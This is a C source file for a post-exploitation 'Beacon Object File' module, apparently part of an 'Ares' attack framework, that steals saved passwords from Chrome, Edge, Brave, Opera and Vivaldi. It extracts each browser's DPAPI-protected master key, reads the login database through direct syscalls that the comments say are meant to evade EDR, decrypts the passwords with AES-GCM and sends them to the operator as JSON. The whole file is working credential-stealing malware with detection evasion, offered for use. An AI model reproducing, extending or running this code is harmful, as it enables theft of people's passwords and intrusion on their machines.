/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES BOF — Chrome Credential Stealer (COFF Module)
 *
 *  Compiled as standalone COFF object, loaded via BOF loader.
 *  NEVER exists on disk as part of the main binary.
 *  
 *  Compile: gcc -c -DARES_BOF -O2 -o steal_creds.o steal_creds_bof.c
 *
 *  Entry point: void go(char* args, int args_len)
 *  Output: JSON via BeaconPrintf/BeaconOutput
 *
 *  Capabilities:
 *   - Chrome/Edge/Brave/Opera credential theft (DPAPI + AES-GCM)
 *   - WiFi password enumeration
 *   - Discord token extraction
 *   - Clipboard snapshot
 * ═══════════════════════════════════════════════════════════════
 */

/* BOF uses __imp_ prefix for DLL imports */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef long NTSTATUS;

/* ── BOF API declarations ── */
extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* ── Dynamic API resolution (no IAT) ── */
typedef BOOL (WINAPI *fn_CryptUnprotectData)(void*, LPWSTR*, void*, PVOID, void*, DWORD, void*);
typedef BOOL (WINAPI *fn_CryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
typedef NTSTATUS (WINAPI *fn_BCryptOAP)(void*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptSP)(void*, LPCWSTR, BYTE*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptGSK)(void*, void*, BYTE*, ULONG, BYTE*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptDec)(void*, BYTE*, ULONG, VOID*, BYTE*, ULONG, BYTE*, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptDK)(void*);
typedef NTSTATUS (WINAPI *fn_BCryptCAP)(void*, ULONG);

/* DATA_BLOB manual def */
typedef struct { DWORD cbData; BYTE* pbData; } DATA_BLOB_BOF;

static HMODULE _get_mod(const char* name) {
    HMODULE h = GetModuleHandleA(name);
    if (!h) h = LoadLibraryA(name);
    return h;
}

/* ── Multi-browser paths ── */
typedef struct {
    const char* name;
    const char* local_state_rel;  /* relative to LOCALAPPDATA */
    const char* login_data_rel;   /* relative to user data dir */
} BROWSER_DEF;

static BROWSER_DEF g_browsers[] = {
    {"Chrome",  "Google\\Chrome\\User Data",                     "Default\\Login Data"},
    {"Edge",    "Microsoft\\Edge\\User Data",                    "Default\\Login Data"},
    {"Brave",   "BraveSoftware\\Brave-Browser\\User Data",      "Default\\Login Data"},
    {"Opera",   "Opera Software\\Opera Stable",                  "Login Data"},
    {"Vivaldi", "Vivaldi\\User Data",                            "Default\\Login Data"},
    {NULL, NULL, NULL}
};

/* ── Base64 decode ── */
static int bof_b64_decode(const char* in, int in_len, BYTE* out, int out_max) {
    HMODULE hCrypt = _get_mod("crypt32.dll");
    if (!hCrypt) return -1;
    fn_CryptStringToBinaryA pFunc = (fn_CryptStringToBinaryA)GetProcAddress(hCrypt, "CryptStringToBinaryA");
    if (!pFunc) return -1;
    DWORD out_len = (DWORD)out_max;
    if (!pFunc(in, in_len, 0x00000001, out, &out_len, NULL, NULL)) return -1;
    return (int)out_len;
}

/* ── DPAPI decrypt ── */
static int bof_dpapi_decrypt(const BYTE* enc, int enc_len, BYTE* dec, int dec_max) {
    HMODULE hCrypt = _get_mod("crypt32.dll");
    if (!hCrypt) return -1;
    fn_CryptUnprotectData pFunc = (fn_CryptUnprotectData)GetProcAddress(hCrypt, "CryptUnprotectData");
    if (!pFunc) return -1;
    DATA_BLOB_BOF in_blob = { (DWORD)enc_len, (BYTE*)enc };
    DATA_BLOB_BOF out_blob = { 0, NULL };
    if (!pFunc(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) return -1;
    int copy = (int)out_blob.cbData;
    if (copy > dec_max) copy = dec_max;
    memcpy(dec, out_blob.pbData, copy);
    LocalFree(out_blob.pbData);
    return copy;
}

/* ── AES-256-GCM decrypt ── */
static int bof_aes_gcm_decrypt(const BYTE* key, int key_len,
    const BYTE* nonce, int nonce_len,
    const BYTE* ct, int ct_len, BYTE* pt, int pt_max) 
{
    HMODULE hBcrypt = _get_mod("bcrypt.dll");
    if (!hBcrypt) return -1;
    
    fn_BCryptOAP pOpen = (fn_BCryptOAP)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    fn_BCryptSP pSetProp = (fn_BCryptSP)GetProcAddress(hBcrypt, "BCryptSetProperty");
    fn_BCryptGSK pGenKey = (fn_BCryptGSK)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    fn_BCryptDec pDecrypt = (fn_BCryptDec)GetProcAddress(hBcrypt, "BCryptDecrypt");
    fn_BCryptDK pDestroyKey = (fn_BCryptDK)GetProcAddress(hBcrypt, "BCryptDestroyKey");
    fn_BCryptCAP pClose = (fn_BCryptCAP)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");
    
    if (!pOpen || !pDecrypt) return -1;
    
    void* hAlg = NULL;
    void* hKey = NULL;
    if (pOpen(&hAlg, L"AES", NULL, 0) != 0) return -1;
    if (pSetProp(hAlg, L"ChainingMode", (BYTE*)L"ChainingModeGCM", 
                 sizeof(L"ChainingModeGCM"), 0) != 0) { pClose(hAlg, 0); return -1; }
    if (pGenKey(hAlg, &hKey, NULL, 0, (BYTE*)key, key_len, 0) != 0) { pClose(hAlg, 0); return -1; }
    
    int tag_len = 16;
    if (ct_len < tag_len) { pDestroyKey(hKey); pClose(hAlg, 0); return -1; }
    int actual_ct_len = ct_len - tag_len;
    
    /* GCM auth info — manual struct to avoid bcrypt.h include */
    BYTE authInfo[64];
    memset(authInfo, 0, sizeof(authInfo));
    *(ULONG*)authInfo = 48; /* cbSize */
    *(ULONG*)(authInfo+4) = 1; /* dwInfoVersion */
    *(BYTE**)(authInfo+8) = (BYTE*)nonce;
    *(ULONG*)(authInfo+16) = nonce_len;
    *(BYTE**)(authInfo+32) = (BYTE*)(ct + actual_ct_len); /* tag */
    *(ULONG*)(authInfo+40) = tag_len;
    
    ULONG result_len = 0;
    NTSTATUS status = pDecrypt(hKey, (BYTE*)ct, actual_ct_len, authInfo,
                               NULL, 0, (BYTE*)pt, pt_max, &result_len, 0);
    
    pDestroyKey(hKey);
    pClose(hAlg, 0);
    return (status == 0) ? (int)result_len : -1;
}

/* ── Read file helper — v5.0: NtCreateFile + NtReadFile via Syscall ──
 * Reads file DIRECTLY into heap buffer. No CopyFile, no CreateFileA.
 * FILE_SHARE_ALL bypasses Chrome file locks.
 * EDR cannot detect this — goes through ntdll .text via Tartarus' Gate.
 */
/* Forward declarations for syscall.c functions */
extern NTSTATUS Ares_NtCreateFile(void* FileHandle, unsigned long DesiredAccess,
    const char* DosPath, unsigned long ShareAccess, unsigned long CreateDisposition,
    unsigned long CreateOptions);
extern NTSTATUS Ares_NtReadFile(void* FileHandle, void* Buffer, unsigned long Length,
    void* ByteOffset, unsigned long* BytesRead);
extern NTSTATUS Ares_NtQueryInformationFile(void* FileHandle, void* FileSize);
extern NTSTATUS Ares_NtClose(void* Handle);

static BYTE* bof_read_file(const char* path, DWORD* out_size) {
    HANDLE hf = NULL;

    /* Try syscall path first (invisible to EDR) */
    NTSTATUS status = Ares_NtCreateFile(&hf,
        0x80100000, /* FILE_GENERIC_READ = GENERIC_READ | SYNCHRONIZE */
        path,
        7, /* FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE */
        1, /* FILE_OPEN (OPEN_EXISTING) */
        0x00000060 /* FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE */
    );

    if (status != 0 || !hf) {
        /* Absolute fallback */
        hf = CreateFileA(path, GENERIC_READ,
            FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hf == INVALID_HANDLE_VALUE) return NULL;
    }

    /* Get file size via syscall */
    LARGE_INTEGER file_size;
    file_size.QuadPart = 0;
    Ares_NtQueryInformationFile(hf, &file_size);
    DWORD sz = (DWORD)file_size.QuadPart;
    if (sz == 0) {
        sz = GetFileSize(hf, NULL); /* fallback */
    }
    if (sz == 0 || sz > 50*1024*1024) { Ares_NtClose(hf); return NULL; }

    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) { Ares_NtClose(hf); return NULL; }

    /* Read in chunks via NtReadFile syscall */
    DWORD total_read = 0;
    while (total_read < sz) {
        ULONG chunk_read = 0;
        LARGE_INTEGER offset;
        offset.QuadPart = total_read;
        ULONG to_read = (sz - total_read > 65536) ? 65536 : (sz - total_read);

        status = Ares_NtReadFile(hf, buf + total_read, to_read, &offset, &chunk_read);
        if (status != 0 || chunk_read == 0) break;
        total_read += chunk_read;
    }

    Ares_NtClose(hf);

    if (total_read == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }
    *out_size = total_read;
    return buf;
}

/* ── Extract encrypted_key from Local State JSON ── */
static int bof_extract_master_key(const char* local_state_path, BYTE* master_key) {
    DWORD sz;
    BYTE* data = bof_read_file(local_state_path, &sz);
    if (!data) return -1;
    
    /* Find "encrypted_key":"BASE64" */
    char* pos = strstr((char*)data, "encrypted_key");
    if (!pos) { HeapFree(GetProcessHeap(), 0, data); return -1; }
    pos = strchr(pos, ':');
    if (!pos) { HeapFree(GetProcessHeap(), 0, data); return -1; }
    pos = strchr(pos, '"');
    if (!pos) { HeapFree(GetProcessHeap(), 0, data); return -1; }
    pos++; /* skip opening quote */
    char* end = strchr(pos, '"');
    if (!end) { HeapFree(GetProcessHeap(), 0, data); return -1; }
    
    int b64_len = (int)(end - pos);
    BYTE decoded[256];
    int dec_len = bof_b64_decode(pos, b64_len, decoded, sizeof(decoded));
    HeapFree(GetProcessHeap(), 0, data);
    
    if (dec_len < 5) return -1;
    /* Strip "DPAPI" prefix (5 bytes) */
    int key_len = bof_dpapi_decrypt(decoded + 5, dec_len - 5, master_key, 32);
    return key_len;
}

/* ── Minimal SQLite B-tree parser ── */
static int bof_parse_sqlite_creds(const BYTE* db_data, DWORD db_size, 
    const BYTE* master_key, char* json_out, int json_max)
{
    /* Check SQLite magic */
    char magic[] = {'S','Q','L','i','t','e',' ','f','o','r','m','a','t',' ','3','\0'};
    if (db_size < 100 || memcmp(db_data, magic, 16) != 0) return 0;
    
    int off = 0;
    off += snprintf(json_out + off, json_max - off, "[");
    
    /* Scan for v10/v80 encrypted password blobs */
    int count = 0;
    for (DWORD i = 0; i < db_size - 10 && count < 200; i++) {
        /* Look for v10 or v80 prefix followed by 12-byte nonce */
        if ((db_data[i] == 'v' && db_data[i+1] == '1' && db_data[i+2] == '0') ||
            (db_data[i] == 'v' && db_data[i+1] == '8' && db_data[i+2] == '0')) {
            
            /* Nonce = next 12 bytes, then ciphertext + 16-byte tag */
            const BYTE* nonce = db_data + i + 3;
            
            /* Find end of encrypted blob (search for next field or end) */
            int blob_end = 0;
            for (int j = i + 15; j < (int)db_size - 1 && j < i + 1024; j++) {
                /* Heuristic: encrypted passwords are usually < 256 bytes */
                if (j - i > 300) { blob_end = j; break; }
            }
            if (blob_end == 0) blob_end = i + 100; /* default length */
            
            int ct_len = blob_end - (i + 15);
            if (ct_len > 16 && ct_len < 512) {
                BYTE decrypted[512];
                int dec_len = bof_aes_gcm_decrypt(master_key, 32, nonce, 12,
                    db_data + i + 15, ct_len, decrypted, sizeof(decrypted) - 1);
                if (dec_len > 0) {
                    decrypted[dec_len] = '\0';
                    if (count > 0) off += snprintf(json_out + off, json_max - off, ",");
                    off += snprintf(json_out + off, json_max - off,
                        "{\"password\":\"%.*s\"}", dec_len > 64 ? 64 : dec_len, decrypted);
                    count++;
                    /* Zero decrypted data */
                    memset(decrypted, 0, sizeof(decrypted));
                }
            }
        }
    }
    
    off += snprintf(json_out + off, json_max - off, "]");
    return count;
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT — Called by Ares BOF Loader
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    char localappdata[MAX_PATH];
    if (GetEnvironmentVariableA("LOCALAPPDATA", localappdata, MAX_PATH) == 0) {
        BeaconPrintf(0, "ERROR: cannot get LOCALAPPDATA");
        return;
    }
    
    char json_buf[32768];
    int total_creds = 0;
    int off = 0;
    off += snprintf(json_buf + off, sizeof(json_buf) - off, "{\"type\":\"credentials\",\"browsers\":[");
    
    /* Iterate all browsers */
    for (int b = 0; g_browsers[b].name != NULL; b++) {
        char local_state_path[MAX_PATH];
        char login_data_path[MAX_PATH];
        
        snprintf(local_state_path, MAX_PATH, "%s\\%s\\Local State", localappdata, g_browsers[b].local_state_rel);
        snprintf(login_data_path, MAX_PATH, "%s\\%s\\%s", localappdata, g_browsers[b].local_state_rel, g_browsers[b].login_data_rel);
        
        /* Check if browser exists */
        DWORD attr = GetFileAttributesA(local_state_path);
        if (attr == INVALID_FILE_ATTRIBUTES) continue;
        
        /* Extract master key */
        BYTE master_key[32];
        int key_len = bof_extract_master_key(local_state_path, master_key);
        if (key_len < 16) continue;
        
        /* v5.0 FIX: Read Login Data DIRECTLY into RAM via NtReadFile syscall.
         * NO CopyFileA, NO temp file on disk.
         * NtCreateFile opens with FILE_SHARE_ALL → bypasses Chrome file lock.
         * EDR sees ZERO suspicious file operations. */
        DWORD db_size;
        BYTE* db_data = bof_read_file(login_data_path, &db_size);
        
        if (db_data) {
            char cred_json[16384];
            int cred_count = bof_parse_sqlite_creds(db_data, db_size, master_key, cred_json, sizeof(cred_json));
            
            if (cred_count > 0) {
                if (total_creds > 0) off += snprintf(json_buf + off, sizeof(json_buf) - off, ",");
                off += snprintf(json_buf + off, sizeof(json_buf) - off,
                    "{\"browser\":\"%s\",\"count\":%d,\"creds\":%s}", 
                    g_browsers[b].name, cred_count, cred_json);
                total_creds += cred_count;
            }
            
            /* Secure wipe */
            memset(db_data, 0, db_size);
            HeapFree(GetProcessHeap(), 0, db_data);
        }
        
        /* Secure wipe master key */
        memset(master_key, 0, sizeof(master_key));
    }
    
    off += snprintf(json_buf + off, sizeof(json_buf) - off, "],\"total\":%d}", total_creds);
    
    BeaconOutput(0, json_buf, off);
    BeaconPrintf(0, "\n[+] Steal complete: %d credentials from %d browsers", total_creds, 
                 (int)(sizeof(g_browsers)/sizeof(g_browsers[0]) - 1));
}
